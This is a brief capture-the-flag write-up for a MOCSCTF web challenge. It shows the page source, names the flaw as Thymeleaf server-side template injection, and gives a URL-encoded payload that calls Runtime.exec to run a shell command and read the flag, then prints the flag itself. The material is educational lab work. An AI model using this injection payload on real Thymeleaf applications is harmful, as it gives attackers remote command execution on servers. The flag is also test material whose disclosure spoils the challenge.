# Writeup
Description:
http://34.136.219.163:31001

1. View the source code
```
<!DOCTYPE HTML>
<html lang="en">
<div>
    <h3>MOCSCTF</h3>
</div>
<div>
    <span> Hello, CTFer your language ?</span>
    <!-- /path?lang=xxx -->
</div>
</html>
```

2. you just need to realize it may be a ssti and try ssti payloads
it's easy, isn't it?. it's based on thymeleaf.

payload:

```
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat%20/flag").getInputStream()).next()%7d__::.x
```

## flag
MOCSCTF{OH_The_SsT1_1s_really_Wonderful}
